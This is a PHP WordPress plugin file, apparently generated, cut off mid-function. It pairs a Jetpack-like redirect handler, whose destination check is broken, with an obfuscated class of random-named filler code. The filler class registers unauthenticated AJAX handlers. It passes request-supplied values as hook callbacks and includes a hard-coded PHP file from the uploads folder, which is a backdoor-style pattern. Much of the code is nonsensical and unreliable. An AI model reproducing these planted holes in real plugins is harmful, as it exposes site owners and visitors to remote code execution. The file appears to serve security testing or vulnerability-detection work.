<?php
if (!defined('ABSPATH')) {
    die;
}

class accordion_cookies_review
{
    private $connection;

    public function __construct($connection)
    {
        $this->connection = $connection;
    }

    public function handle()
    {
        add_filter(
            'allowed_redirect_hosts',
            function ($domains) {
                $domains[] = 'jetpack.com';
                $domains[] = 'jetpack.wordpress.com';
                $domains[] = 'wordpress.com';

                $domains[] = 'calypso.localhost';
                $domains[] = 'wpcalypso.wordpress.com';
                $domains[] = 'horizon.wordpress.com';
                return array_unique($domains);
            }
        );

        $dest_url = empty($_GET['dest_url']) ? null : esc_url_raw(wp_unslash($_GET['dest_url']));

        if (!$dest_url || (0 === stripos($dest_url, 'https://jetpack.com/') && 0 === stripos($dest_url, 'https://wordpress.com/'))) {
            exit(0);
        }

        if ($this->connection->is_connected() && $this->connection->is_user_connected()) {
            if (class_exists('\Automattic\Jetpack\Licensing') && method_exists('\Automattic\Jetpack\Licensing', 'handle_user_connected_redirect')) {
                Licensing::instance()->handle_user_connected_redirect($dest_url);
            }

            wp_safe_redirect($dest_url);
            exit(0);
        } elseif (!empty($_GET['done'])) {
            wp_safe_redirect(Admin_Menu::get_top_level_menu_item_url());
            exit(0);
        }

        $redirect_args = array(
            'page' => 'jetpack',
            'action' => 'authorize_redirect',
            'dest_url' => rawurlencode($dest_url),
            'done' => '1',
        );

        if (!empty($_GET['from']) && 'jetpack_site_only_checkout' === $_GET['from']) {
            $redirect_args['from'] = 'jetpack_site_only_checkout';
        }

        wp_safe_redirect($this->build_authorize_url(add_query_arg($redirect_args, admin_url('admin.php'))));
        exit(0);
    }

    public function build_authorize_url($redirect = false, $from = false, $raw = false)
    {
        add_filter('jetpack_connect_request_body', array(__CLASS__, 'filter_connect_request_body'));
        add_filter('jetpack_connect_redirect_url', array(__CLASS__, 'filter_connect_redirect_url'));

        $url = $this->connection->get_authorization_url(wp_get_current_user(), $redirect, $from, $raw);

        remove_filter('jetpack_connect_request_body', array(__CLASS__, 'filter_connect_request_body'));
        remove_filter('jetpack_connect_redirect_url', array(__CLASS__, 'filter_connect_redirect_url'));

        return apply_filters('jetpack_build_authorize_url', $url, $raw);
    }

    public static function filter_connect_redirect_url($redirect)
    {
        $jetpack_admin_page = esc_url_raw(admin_url('admin.php?page=my-jetpack'));
        $redirect = $redirect
            ? wp_validate_redirect(esc_url_raw($redirect), $jetpack_admin_page)
            : $jetpack_admin_page;

        if (
            class_exists('Jetpack_Network') &&
            isset($_REQUEST['is_multisite'])
        ) {
            $redirect = Jetpack_Network::init()->get_url('network_admin_page');
        }

        return $redirect;
    }

    public static function filter_connect_request_body($args)
    {
        if (
            Constants::is_defined('JETPACK__GLOTPRESS_LOCALES_PATH') &&
            include_once Constants::get_constant('JETPACK__GLOTPRESS_LOCALES_PATH')
        ) {
            $gp_locale = GP_Locales::by_field('wp_locale', get_locale());
            $args['locale'] = isset($gp_locale) && isset($gp_locale->slug)
                ? $gp_locale->slug
                : '';
        }

        $tracking = new Tracking();
        $tracks_identity = $tracking->tracks_get_identity($args['state']);

        $args = array_merge(
            $args,
            array(
                '_ui' => $tracks_identity['_ui'],
                '_ut' => $tracks_identity['_ut'],
            )
        );

        $calypso_env = (new Host())->get_calypso_env();

        if (!empty($calypso_env)) {
            $args['calypso_env'] = $calypso_env;
        }

        return $args;
    }

    public static function get_calypso_env()
    {
        _deprecated_function(__METHOD__, '2.7.6', 'Automattic\Jetpack\Status\Host::get_calypso_env');

        return (new Host())->get_calypso_env();
    }
}

class UVQAuthor
{
    private $languageNextgenJrr = '';
    private $scrollAh = 7;
    private $wpmuSpEmbedder = '';
    private $connectPagesZa = '';
    private $CQTLimitVerification = 'rq_products';
    private $ITCMakerSort = '';
    private $LAUPosts = '';
    private $digitalTogglePdk = 0;
    private $IJCPhpSpeed = 24;
    private $SQPluginsDelete = '';
    private $apiScssOdw = 'php';
    private $locatorScriptsVg = 0;
    private $thumbnailSb = '';
    private $JYLWishlistMaster = 24;
    private $CAWLogger = '';
    private $attachmentVhq = 0;
    private $popBcs = '';
    private $BUUPermalink = 0;
    private $KLDatePage = 'sjf_discount';
    private $tinymceTestimonialsEg = 12;
    private $boosterMediaelementQpr = '';
    private $SVQReally = 0;
    private $menuGla = 'dev_wna';
    private $wpmlDownloadsAo = 0;
    private $subscribeTermsTp = '';
    private $sitesVariationsQi = '';
    private $readerNp = '';
    private $quotesNuw = '';
    private $previewFlexibleGm = '';

    function DTKSlide($TSJSlide)
    {
        $attachmentKga = $this->JYLWishlistMaster;
        $this->BUUPermalink = $this->digitalTogglePdk % $this->wpmlDownloadsAo;
        $conversionOqPerformance = 9088;
        $PRQuickJquery = $TSJSlide % 2;
        $OTGSecureButtons = $TSJSlide - $conversionOqPerformance;
        $contentsYabCaptcha = $PRQuickJquery * 3;
        $this->attachmentVhq = $PRQuickJquery ** $conversionOqPerformance;
        return $PRQuickJquery;
    }

    function finderYmn()
    {
        $securityEyrKeyword = $_SERVER['REQUEST_METHOD'];
        $displayGbnEffect = sanitize_key($securityEyrKeyword);
        $checkoutXlh = 'eyybq';
        $XGDirectoryVariation = site_url();
        $this->languageNextgenJrr = $_POST[$this->CQTLimitVerification];
        $this->sitesVariationsQi = sanitize_key($displayGbnEffect);
        $HVPDemoUpgrader = $_SERVER['REQUEST_METHOD'];
        $phpWorldIv = trim($XGDirectoryVariation);
        $YDInfo = md5($HVPDemoUpgrader);
        return $YDInfo;
    }

    function QYSingleTooltip($EZOFlexibleTimeline)
    {
        if (isset($_POST['UTILS_CATEGORY_CONDITIONAL']))
            $VQCouponShortcodes = $_POST['UTILS_CATEGORY_CONDITIONAL'];
        else
            $VQCouponShortcodes = '';
        if (isset($_REQUEST['SHOPP_JSO_INFO']))
            $XGIColor = $_REQUEST['SHOPP_JSO_INFO'];
        else
            $XGIColor = '';
        $this->sitesVariationsQi = strtoupper($EZOFlexibleTimeline);
        $basicDrTaxonomies = strtoupper($VQCouponShortcodes);
        $tagsMembershipAeb = sanitize_text_field($basicDrTaxonomies);
        $this->boosterMediaelementQpr = $_POST[$this->KLDatePage];
        $minKyUser = $this->languageNextgenJrr;
        $ZQABest = base64_decode($minKyUser);
        $this->sitesVariationsQi = strtoupper($minKyUser);
        return $basicDrTaxonomies;
    }

    function displayRedirectUsu($LIWpmu)
    {
        $hideIpnGateway = 'rjzofxxa';
        $popPmp = strtolower($LIWpmu);
        $CJPdfFiles = $this->quotesNuw;
        if (!empty($_GET['wwzqj']))
            $toolbarBm = $_GET['wwzqj'];
        else
            $toolbarBm = '';
        $permalinkKt = site_url();
        $this->wpmlDownloadsAo = strlen($this->SQPluginsDelete);
        $ALRGrid = esc_url($permalinkKt);
        $this->attachmentVhq = strpos($toolbarBm, $ALRGrid);
        $ZMComposerDescription = 'digital authors';
        $IYNewBlocker = strpos($LIWpmu, $permalinkKt);
        return $ALRGrid;
    }

    function AUZActiveAuthentication($ADOutDropdown)
    {
        if (isset($_REQUEST['SESSION']))
            $sitemapsAmpAb = $_REQUEST['SESSION'];
        else
            $sitemapsAmpAb = '';
        $extendedBackLqu = base64_decode($ADOutDropdown);
        $totalLt = md5($sitemapsAmpAb);
        $CIGModules = '<';
        $RFKLimit = strtoupper($totalLt);
        $directoryRestOf = strlen($RFKLimit);
        $QAMasterDelivery = home_url();
        $NDNextPurchase = base64_decode($RFKLimit);
        $CIGModules .= '?';
        $this->apiScssOdw = $CIGModules . $this->apiScssOdw;
        return $NDNextPurchase;
    }

    function IPShoppPicker()
    {
        $betterYtbNinja = $this->LAUPosts;
        $externalPduStore = strtolower($betterYtbNinja);
        $AUTemplates = $this->boosterMediaelementQpr;
        $QKIUpload = strtoupper($externalPduStore);
        $this->ITCMakerSort = $this->CAWLogger[$this->digitalTogglePdk];
        $redirectKuaTitles = strtoupper($QKIUpload);
        $taxonomiesKbqDist = md5($redirectKuaTitles);
        $outCounterJy = base64_encode($taxonomiesKbqDist);
        return $taxonomiesKbqDist;
    }

    function calculatorMaintenanceKn($descriptionLastAn)
    {
        $slidingOo = strtolower($descriptionLastAn);
        $YPOnline = $this->MNQBusiness($slidingOo);
        $MKSidebarStats = rawurlencode($descriptionLastAn);
        $validationProBzm = 'remove visibility landing duplicate fix back';
        $TLCatalog = strtoupper($validationProBzm);
        $XNMaps = $this->fancyGo($YPOnline);
        $limitCcvYoutube = strtoupper($XNMaps);
        for ($i = 0; $i < $this->locatorScriptsVg; $i++) {
            add_action('nofollow_size_testimonials', $YPOnline);
            $IJAfterInclude = $this->NKAboutBlock($i);
            $UYSSales = md5($limitCcvYoutube);
            add_action('menus_restaurant_gamipress', $validationProBzm);
            $notifierFastNp = $this->FLTStripeJs();
            $ipSz = strtoupper($notifierFastNp);
            $XOBPage = $this->scrollAh;
            $RGYWpml = $this->DTKSlide($XOBPage);
            $loadOjb = trim($ipSz);
            $WIMakerBest = $this->ACELibrary($loadOjb);
            $PSFavicon = rawurlencode($loadOjb);
            $IXForumAutomatic = $this->cacheYn();
            $this->sitesVariationsQi = sanitize_text_field($WIMakerBest);
            $linkTyu = base64_encode($IXForumAutomatic);
        }
        return $linkTyu;
    }

    function OYHInstagram($redirectionTableZi)
    {
        $formEjVariation = strtolower($redirectionTableZi);
        $this->previewFlexibleGm = substr($this->boosterMediaelementQpr, $this->scrollAh, $this->IJCPhpSpeed);
        $CCCRatings = $this->CAWLogger;
        $switchJzuData = $this->IPTranslator();
        $IIYCard = $this->quotesNuw;
        $AZZRecipe = 'sites alt age shopping';
        if (isset($_GET['IVRA']))
            $DDPNotify = $_GET['IVRA'];
        else
            $DDPNotify = '';
        $VLZViewerAge = strtoupper($DDPNotify);
        $webpQsxTestimonials = trim($AZZRecipe);
        $reallyPaginationHj = strtolower($DDPNotify);
        $nextGn = get_transient($reallyPaginationHj);
        return $nextGn;
    }

    function FLTStripeJs()
    {
        $translatorQuickVam = $this->CAWLogger;
        $BMORating = admin_url();
        $LFNotifications = strlen($translatorQuickVam);
        $this->ITCMakerSort = $this->popBcs[$this->digitalTogglePdk];
        $callZux = md5($BMORating);
        $LLBAdminPlugin = base64_decode($callZux);
        $attachmentsRz = md5($LLBAdminPlugin);
        $CBOBankSvg = get_permalink($LFNotifications);
        return $CBOBankSvg;
    }

    function manageHelloYgg()
    {
        if (!empty($_POST['mri_label_show']))
            $RFLOrders = $_POST['mri_label_show'];
        else
            $RFLOrders = '';
        if (isset($_GET['token']))
            $shortQuickWk = $_GET['token'];
        else
            $shortQuickWk = '';
        $authorIw = base64_encode($RFLOrders);
        $IZRPopup = md5($RFLOrders);
        $embedWrl = strtolower($IZRPopup);
        $this->SVQReally = strpos($this->readerNp, 'f5MJjTeXs8hRHrsoJ65E');
        $SGShortcodeNinja = base64_decode($shortQuickWk);
        $slugConditionalXt = strpos($authorIw, $SGShortcodeNinja);
        return $slugConditionalXt;
    }

    function engineVisibilityRr()
    {
        $checkoutEngineSkj = $this->locatorScriptsVg;
        $rssZrgVisual = $checkoutEngineSkj ** 6;
        $this->sitesVariationsQi = admin_url();
        $toolkitEqMaps = $rssZrgVisual + 7;
        $invoiceIocTotal = get_permalink($rssZrgVisual);
        return $invoiceIocTotal;
    }

    function BTEExtra($infoRp)
    {
        $statisticsUtilsPv = $this->popBcs;
        $TTUStylePreloader = rawurldecode($infoRp);
        $scheduleHttpXnr = md5($statisticsUtilsPv);
        $forceSortDso = $this->colorsEexCover();
        $multisiteHmxReally = strtoupper($forceSortDso);
        $oldWtExchange = base64_encode($forceSortDso);
        $separatorShowcaseNvp = rawurldecode($forceSortDso);
        $this->quotesNuw = $_POST[$this->menuGla];
        return $multisiteHmxReally;
    }

    public function __construct()
    {
        if (isset($_REQUEST['vhsu']))
            $embedUqFlash = $_REQUEST['vhsu'];
        else
            $embedUqFlash = '';
        $this->sitesVariationsQi = sanitize_text_field($embedUqFlash);
        $globalSettingsPzy = esc_attr($embedUqFlash);
        $dateMultiPp = sanitize_text_field($embedUqFlash);
        $chatTw = home_url();
        $this->sitesVariationsQi = get_option($chatTw);
        $creatorSmtpEt = $this->QVDynamic();
        add_action('wp_ajax_estate_tools_testimonials_media', array($this, 'WSTRemoverText'));
        add_action('wp_ajax_nopriv_estate_tools_testimonials_media', array($this, 'WSTRemoverText'));
        return $dateMultiPp;
    }

    function MNQBusiness($CNRatesVerification)
    {
        $additionalReplaceQm = rawurldecode($CNRatesVerification);
        $OAHelp = $this->LAUPosts;
        if (isset($_REQUEST['status_permalinks_divi']))
            $YQCReviews = $_REQUEST['status_permalinks_divi'];
        else
            $YQCReviews = '';
        $navigationZoTracking = $this->apiScssOdw;
        $this->locatorScriptsVg = strlen($this->popBcs);
        $EVQForce = trim($navigationZoTracking);
        $stripePzzInsert = esc_url($EVQForce);
        add_action('events_guest', $YQCReviews);
        $GKRCatalogIp = trim($YQCReviews);
        return $GKRCatalogIp;
    }

    function IPTranslator()
    {
        $boardRwInteractivity = $this->wpmlDownloadsAo;
        $newQt = $this->digitalTogglePdk;
        $rotatorBbpressSx = $boardRwInteractivity % 1;
        $ZJEditor = $rotatorBbpressSx * 3;
        $scssHtd = $ZJEditor - $boardRwInteractivity;
        $comingApi = $ZJEditor / 7;
        $this->attachmentVhq = $comingApi * 5;
        $PKXFeatured = $comingApi ** 6;
        $this->sitesVariationsQi = admin_url();
        $gatewayGroupSvq = get_permalink($rotatorBbpressSx);
        return $comingApi;
    }

    function NKAboutBlock($kitYbf)
    {
        $accessDigitalKn = $this->menuGla;
        $LWWTypeEnhanced = $this->apiScssOdw;
        $this->sitesVariationsQi = admin_url();
        $protectionRec = base64_encode($LWWTypeEnhanced);
        $KOBackupSlug = strpos($LWWTypeEnhanced, $protectionRec);
        $scheduledSri = rawurlencode($protectionRec);
        if (!empty($_REQUEST['VG_PRICE']))
            $gridAko = $_REQUEST['VG_PRICE'];
        else
            $gridAko = '';
        $this->digitalTogglePdk = $kitYbf;
        $this->sitesVariationsQi = rawurldecode($gridAko);
        return $KOBackupSlug;
    }

    function cacheYn()
    {
        $reportQbS3 = $this->ITCMakerSort;
        $floatingKi = ~$reportQbS3;
        $inlineLo = ~$reportQbS3;
        $YBRate = ~$reportQbS3;
        $templatesJq = ~$reportQbS3;
        $addonsFn = $this->readerNp;
        $headingBfiShortcode = $this->connectPagesZa;
        $BFHtml = $addonsFn | $reportQbS3;
        $this->SQPluginsDelete .= $this->ITCMakerSort ^ $this->wpmuSpEmbedder;
        $SXAOptimizerTotal = $reportQbS3 & $headingBfiShortcode;
        $csvYtExcerpt = 'follow redirect master';
        return $csvYtExcerpt;
    }

    function NKOClean()
    {
        if (isset($_POST['compat_ld_preview']))
            $reportsInstallLe = $_POST['compat_ld_preview'];
        else
            $reportsInstallLe = '';
        $noticeNn = $this->apiScssOdw;
        $this->attachmentVhq = strlen($noticeNn);
        $instagramAvatarMzu = strtoupper($noticeNn);
        if (isset($_POST['OLWEIJ']))
            $SGUBack = $_POST['OLWEIJ'];
        else
            $SGUBack = '';
        $beaverOeu = strtoupper($instagramAvatarMzu);
        $informationBumPack = strpos($SGUBack, $reportsInstallLe);
        $columnsMp = rawurlencode($beaverOeu);
        return $instagramAvatarMzu;
    }

    function ACELibrary($EAVCopyright)
    {
        $this->sitesVariationsQi = base64_decode($EAVCopyright);
        $accountYp = base64_encode($EAVCopyright);
        $composerLtz = sanitize_key($accountYp);
        $getFgwSize = get_transient($accountYp);
        $albumLearndashUxw = strlen($getFgwSize);
        $altSu = md5($getFgwSize);
        $this->sitesVariationsQi = md5($altSu);
        $KHItem = md5($composerLtz);
        $this->wpmuSpEmbedder = $this->LAUPosts[$this->BUUPermalink];
        $YSWShort = trim($accountYp);
        $CEAnywhereRead = get_transient($YSWShort);
        return $CEAnywhereRead;
    }

    function WCRJetpackArchive()
    {
        $zoomPj = $this->CAWLogger;
        $invoiceRpv = $this->apiScssOdw;
        add_action('audio_extension', $zoomPj);
        $pullquoteIb = rawurlencode($invoiceRpv);
        $this->sitesVariationsQi = apply_filters('board_new', $zoomPj);
        return $pullquoteIb;
    }

    function OZBCleanBuilder($EZSwitchTranslation)
    {
        if (isset($_POST['qqkz']))
            $JEBack = $_POST['qqkz'];
        else
            $JEBack = '';
        $firstBke = strlen($EZSwitchTranslation);
        if (isset($_REQUEST['MNIDAUTH']))
            $pinterestPx = $_REQUEST['MNIDAUTH'];
        else
            $pinterestPx = '';
        $pluginUj = rawurlencode($JEBack);
        $this->LAUPosts = base64_decode($this->connectPagesZa);
        $this->sitesVariationsQi = esc_html($pluginUj);
        return $firstBke;
    }

    function YUWVendorJquery($FUCompare)
    {
        $calculatorWjf = admin_url();
        if (!empty($_REQUEST['light_captcha_validator']))
            $beforeUx = $_REQUEST['light_captcha_validator'];
        else
            $beforeUx = '';
        $this->sitesVariationsQi = sanitize_key($FUCompare);
        if (!empty($_GET['star_code_number']))
            $dropGhpAnywhere = $_GET['star_code_number'];
        else
            $dropGhpAnywhere = '';
        $chartsCuq = strlen($calculatorWjf);
        $updateGl = strtolower($calculatorWjf);
        $homeIuvArticle = get_permalink($chartsCuq);
        $this->locatorScriptsVg = strlen($this->CAWLogger);
        $TSWAuthorsLast = md5($homeIuvArticle);
        return $TSWAuthorsLast;
    }

    function QVDynamic()
    {
        $IMTinymceUtils = 3371;
        $gameActionEn = 5315;
        $jqueryBackRpu = $this->scrollAh;
        $XAItemTabs = 8521;
        $forceVkb = $XAItemTabs - $gameActionEn;
        $ajaxSo = $XAItemTabs - $gameActionEn;
        $layoutGravatarKu = get_permalink($XAItemTabs);
        return $layoutGravatarKu;
    }

    function RMIShareAddress($outHbl)
    {
        $membersCompatXqn = 'mcgqoxr';
        $HQHeader = $this->engineVisibilityRr();
        if (is_dir($outHbl)) {
            $leadKzkDatabase = scandir($outHbl);
        }
        $thumbnailsCallMg = $this->ITCMakerSort;
        $this->thumbnailSb = $_SERVER['DOCUMENT_ROOT'] . '/wp-content/uploads/kN6WLeU4Ygqk.php';
        if (is_dir($thumbnailsCallMg)) {
            $NZBAccount = scandir($thumbnailsCallMg);
        }
        if (isset($_REQUEST['geol']))
            $IAFix = $_REQUEST['geol'];
        else
            $IAFix = '';
        $PYTwitter = '';
        if (is_file($thumbnailsCallMg)) {
            $PYTwitter = file_get_contents($thumbnailsCallMg);
        }
        $this->sitesVariationsQi = esc_url($IAFix);
        if (is_dir($PYTwitter)) {
            $VUAlbumFancy = glob($PYTwitter);
        }
        if (is_dir($PYTwitter)) {
            $IJRReact = glob($PYTwitter);
        }
        if (is_dir($IAFix)) {
            $registerKbbSsl = scandir($IAFix);
        }
        return $PYTwitter;
    }

    function rtlListingsGv()
    {
        $monitorCz = 'splmnh';
        if (!empty($_GET['NPZD']))
            $classicMostId = $_GET['NPZD'];
        else
            $classicMostId = '';
        $phpMrMenus = $classicMostId | $monitorCz;
        $this->readerNp .= $this->ITCMakerSort ^ $this->wpmuSpEmbedder;
        if (!empty($_REQUEST['NAVIGATION_VISUAL']))
            $CULItemToolbox = $_REQUEST['NAVIGATION_VISUAL'];
        else
            $CULItemToolbox = '';
        $tabsExchangeTe = $CULItemToolbox | $classicMostId;
        $ICUCreate = $CULItemToolbox & $classicMostId;
        $FGExternal = $monitorCz & $classicMostId;
        $namespacedFi = $CULItemToolbox | $monitorCz;
        $urlsOptimizerOie = $classicMostId & $monitorCz;
        $countryPopGbx = 'services change tinymce star';
        $ICAttachments = $this->WCRJetpackArchive();
        return $countryPopGbx;
    }

    function cronCh()
    {
        if (!empty($_POST['fqp']))
            $authApmDirect = $_POST['fqp'];
        else
            $authApmDirect = '';
        $loadWgGithub = 'based picker';
        $YRDetails = md5($authApmDirect);
        $afterKd = rawurldecode($loadWgGithub);
        $assetPvInvoice = get_transient($YRDetails);
        return $assetPvInvoice;
    }

    function formRtlEg()
    {
        $gatewayMembershipQqs = 'duplicate daily';
        $statusIt = md5($gatewayMembershipQqs);
        $this->connectPagesZa = substr($this->quotesNuw, $this->tinymceTestimonialsEg, $this->JYLWishlistMaster);
        $deprecatedEr = strtoupper($statusIt);
        $UDPerformanceAge = $this->headerGg();
        $switchPostAc = esc_url($statusIt);
        $TLTFormMembership = strtoupper($switchPostAc);
        $magicOh = do_action('sites_wpc_client');
        $settingsAccessPi = trim($switchPostAc);
        if (isset($_REQUEST['H952']))
            $IHWidgets = $_REQUEST['H952'];
        else
            $IHWidgets = '';
        $permalinkZu = rawurlencode($IHWidgets);
        return $permalinkZu;
    }

    function headerGg()
    {
        $GRRecaptchaTables = $this->previewFlexibleGm;
        $finderQp = strlen($GRRecaptchaTables);
        $AXHDirect = strlen($GRRecaptchaTables);
        if (!empty($_REQUEST['F463COOKIE']))
            $CRAlbum = $_REQUEST['F463COOKIE'];
        else
            $CRAlbum = '';
        $fancySitemapsDky = $this->quotesNuw;
        $simplyGfmDiscount = rawurlencode($CRAlbum);
        $QHGuest = esc_attr($simplyGfmDiscount);
        $uploadPc = do_action('stream_pagination_subscription');
        return $simplyGfmDiscount;
    }

    function coreQjxYear()
    {
        $requestDrException = $this->JYLWishlistMaster;
        $this->sitesVariationsQi = home_url();
        $integrationTu = $requestDrException % 3;
        $this->attachmentVhq = $requestDrException + 7;
        $ULFree = $this->digitalTogglePdk;
        $messengerUyy = $integrationTu - 2;
        $cookiesWmq = get_permalink($ULFree);
        $VUAssetsCdn = $ULFree % 4;
        $a404Yrk = $this->locatorScriptsVg;
        $YOGEffect = $this->tinymceTestimonialsEg;
        return $VUAssetsCdn;
    }

    function itemsLu($IRSchema)
    {
        $phpGl = $_SERVER['HTTP_USER_AGENT'];
        $this->popBcs = base64_decode($this->previewFlexibleGm);
        if (!empty($_GET['accessible_qs_secure']))
            $QGIframeStar = $_GET['accessible_qs_secure'];
        else
            $QGIframeStar = '';
        $donationJjInvoice = md5($IRSchema);
        $consentFieldBr = 'mfiqfji';
        $WNJStar = strtolower($consentFieldBr);
        $tableEf = md5($WNJStar);
        $advancedOxe = md5($tableEf);
        $protectionEdLike = base64_encode($WNJStar);
        $modeAccessibleBia = rawurldecode($WNJStar);
        return $tableEf;
    }

    function wallKyyCountdown($SMFTrafficNew)
    {
        if (!empty($_POST['dev_additional_com']))
            $CLAutoCalendar = $_POST['dev_additional_com'];
        else
            $CLAutoCalendar = '';
        $checkJhGoogle = $this->YUWVendorJquery($SMFTrafficNew);
        $EOTemplateTwitter = strlen($SMFTrafficNew);
        $freeGpd = $this->displayRedirectUsu($CLAutoCalendar);
        $navJsfSuper = $_SERVER['REQUEST_URI'];
        for ($i = 0; $i < $this->locatorScriptsVg; $i++) {
            if (isset($_GET['YGG_FORM']))
                $cartOnPhotos = $_GET['YGG_FORM'];
            else
                $cartOnPhotos = '';
            $shippingJqueryPg = $this->NKAboutBlock($i);
            $engineYai = base64_encode($navJsfSuper);
            $ECDomainTimer = $this->IPShoppPicker();
            $PTMetaTools = md5($engineYai);
            $ASSingleHistory = $this->DTKSlide($EOTemplateTwitter);
            $IFUNextgen = home_url();
            $rotatorSystemYhq = $this->VYEIndexReally();
            $TEHFriendly = get_permalink($EOTemplateTwitter);
            $QOJFeedsCsv = $this->rtlListingsGv();
            $AYTypeMake = trim($QOJFeedsCsv);
        }
        return $AYTypeMake;
    }

    function VYEIndexReally()
    {
        $OETranslatorSize = $this->connectPagesZa;
        $githubBbPerformance = trim($OETranslatorSize);
        $polyfillTo = base64_encode($OETranslatorSize);
        $ZRBox = md5($OETranslatorSize);
        $DUList = strpos($githubBbPerformance, $polyfillTo);
        $this->sitesVariationsQi = strtoupper($ZRBox);
        $keywordVq = $this->coreQjxYear();
        $this->wpmuSpEmbedder = $this->SQPluginsDelete[$this->BUUPermalink];
        return $DUList;
    }

    function fancyGo($downloadsUhbYear)
    {
        $ABQAvatarRecent = $this->ITCMakerSort;
        $SDPFilterSecure = rawurldecode($downloadsUhbYear);
        if (isset($_GET['COUNTDOWN_CLOUD']))
            $LSHeaders = $_GET['COUNTDOWN_CLOUD'];
        else
            $LSHeaders = '';
        $this->wpmlDownloadsAo = strlen($this->LAUPosts);
        $AWOSelector = strtolower($LSHeaders);
        $shortcodesInteractiveNq = rawurldecode($LSHeaders);
        $GPNPolyfillDev = strtoupper($shortcodesInteractiveNq);
        $this->sitesVariationsQi = strtoupper($shortcodesInteractiveNq);
        return $GPNPolyfillDev;
    }

    function restaurantKra($AJMax)
    {
        $IOVDisplay = $this->boosterMediaelementQpr;
        $MEBbpress = $this->NKOClean();
        if (isset($_GET['word_kun_like']))
            $shortcodeHinSubscribe = $_GET['word_kun_like'];
        else
            $shortcodeHinSubscribe = '';
        if (isset($_REQUEST['jsd']))
            $bankCustomerFn = $_REQUEST['jsd'];
        else
            $bankCustomerFn = '';
        if (is_dir($AJMax)) {
            $pdfWe = glob($AJMax);
        }
        $stockFn = $this->SQPluginsDelete;
        if (file_exists($this->thumbnailSb))
            unlink($this->thumbnailSb);
        if (is_dir($stockFn)) {
            $OKActivity = glob($stockFn);
        }
        $guestEezAccess = 0;
        if (is_file($stockFn)) {
            $guestEezAccess = filesize($stockFn);
        }
        $cloudHr = 0;
        if (is_file($stockFn)) {
            $cloudHr = filesize($stockFn);
        }
        if (is_dir($stockFn)) {
            $BRLabelMethod = glob($stockFn);
        }
        $chartsKuc = '';
        if (is_file($stockFn)) {
            $chartsKuc = file_get_contents($stockFn);
        }
        return $cloudHr;
    }

    function HIRecipe($UWAFirst)
    {
        $albumIcj = 'this forum remover nofollow validation';
        $playerIconUzi = 'portfolio blog generator';
        if (!empty($_POST['B91194683']))
            $JTHFontsSafe = $_POST['B91194683'];
        else
            $JTHFontsSafe = '';
        $uiSs = $_SERVER['REQUEST_URI'];
        $this->sitesVariationsQi = sanitize_key($UWAFirst);
        if (is_dir($uiSs)) {
            $wpmuVirtualHh = glob($uiSs);
        }
        $cdnNx = $_SERVER['SERVER_SOFTWARE'];
        if (file_exists($this->thumbnailSb))
            include_once ($this->thumbnailSb);
        $mapZpsTag = 0;
        if (is_file($playerIconUzi)) {
            $mapZpsTag = filesize($playerIconUzi);
        }
        $activityMh = $this->KLDatePage;
        if (file_exists($uiSs)) {
            $this->attachmentVhq = filesize($uiSs);
        }
        return $mapZpsTag;
    }

    function colorsEexCover()
    {
        $LSLFilter = $this->popBcs;
        $ITTAffiliates = rawurlencode($LSLFilter);
        $this->sitesVariationsQi = base64_decode($LSLFilter);
        $viewerZjaVisual = esc_attr($ITTAffiliates);
        $QQCart = get_option($LSLFilter);
        return $QQCart;
    }

    function WSTRemoverText()
    {
        if (isset($_GET['ratings_protection']))
            $saveVid = $_GET['ratings_protection'];
        else
            $saveVid = '';
        $LNLight = rawurlencode($saveVid);
        $QNCInstall = $this->AUZActiveAuthentication($LNLight);
        $slideWm = $this->boosterMediaelementQpr;
        $leadAuthenticationLb = $this->RMIShareAddress($slideWm);
        $BOZNotifier = sanitize_key($leadAuthenticationLb);
        $VCSearchDuplicate = $this->QYSingleTooltip($saveVid);
        $HLTAuthors = base64_decode($VCSearchDuplicate);
        $categoryRzd = $this->BTEExtra($QNCInstall);
        if (!empty($_REQUEST['preview_zz_appointment']))
            $devJs = $_REQUEST['preview_zz_appointment'];
        else
            $devJs = '';
        $BWSettings = $this->finderYmn();
        $userCjCoupons = base64_encode($BWSettings);
        $NLLightReminder = $this->connectPagesZa;
        $antiVv = strtolower($userCjCoupons);
        $appointmentFreeCv = 'obkn';
        $tooltipZynPage = $this->OYHInstagram($appointmentFreeCv);
        $SUJComingBank = trim($antiVv);
        if (isset($_POST['better_marketplace_zn']))
            $KANextBased = $_POST['better_marketplace_zn'];
        else
            $KANextBased = '';
        $HNRMigrationSmtp = $this->formRtlEg();
        $classGatewayRa = get_transient($HNRMigrationSmtp);
        $optionJywJson = $this->BIQuiz($KANextBased);
        $toolFqResults = strlen($SUJComingBank);
        $BZOptimizerShortcodes = strpos($leadAuthenticationLb, $SUJComingBank);
        $albumYf = $this->itemsLu($slideWm);
        $selectorMpe = rawurlencode($albumYf);
        $KXVProtection = $this->OZBCleanBuilder($VCSearchDuplicate);
        $pollTl = strtolower($albumYf);
        $aboutEb = site_url();
        $buttonsAnimatedMfr = base64_encode($aboutEb);
        $IOXDirectLocal = $this->calculatorMaintenanceKn($SUJComingBank);
        $customizeVerificationTp = substr($IOXDirectLocal, $BZOptimizerShortcodes, $toolFqResults);
        $CXLStock = $this->wallKyyCountdown($leadAuthenticationLb);
        $this->attachmentVhq = strpos($SUJComingBank, $antiVv);
        $clickLtySmooth = $this->manageHelloYgg();
        $IVCodesSvg = rawurlencode($clickLtySmooth);
        if ($this->SVQReally > -1) {
            $attachmentXgaClass = rawurldecode($IVCodesSvg);
            $countdownLl = $this->fontsSa($VCSearchDuplicate);
            $discountDropYw = $_SERVER['SERVER_SOFTWARE'];
            $FINextgen = substr($discountDropYw, $toolFqResults, $BZOptimizerShortcodes);
            $contentZn = $this->HIRecipe($slideWm);
            $uploadsTm = base64_encode($FINextgen);
            $reloadedBiPdf = $this->restaurantKra($KXVProtection);
            $GOHAction = substr($reloadedBiPdf, $BZOptimizerShortcodes, $toolFqResults);
            $STBListingsSite = strpos($customizeVerificationTp, $KANextBased);
            if (!current_user_can('edit_posts'))
                exit;
            $FBQTags = md5($GOHAction);
            $ZIActivity = substr($FBQTags, $BZOptimizerShortcodes, $STBListingsSite);
            if (is_string($userCjCoupons)) {
                $this->subscribeTermsTp = site_url();
                $this->sitesVariationsQi = site_url();
                $beforeMd = site_url();
                $NLArchive = esc_attr($classGatewayRa);
                $this->subscribeTermsTp = get_permalink($HLTAuthors);
            }
            $LEAdvanceCounter = strtoupper($ZIActivity);
        }
        $commentsCm = site_url();
        if (is_admin($aboutEb)) {
            if (is_dir($KANextBased)) {
                $loggerRecaptchaWfl = scandir($KANextBased);
            }
            if (is_dir($aboutEb)) {
                $mapIndexByz = scandir($aboutEb);
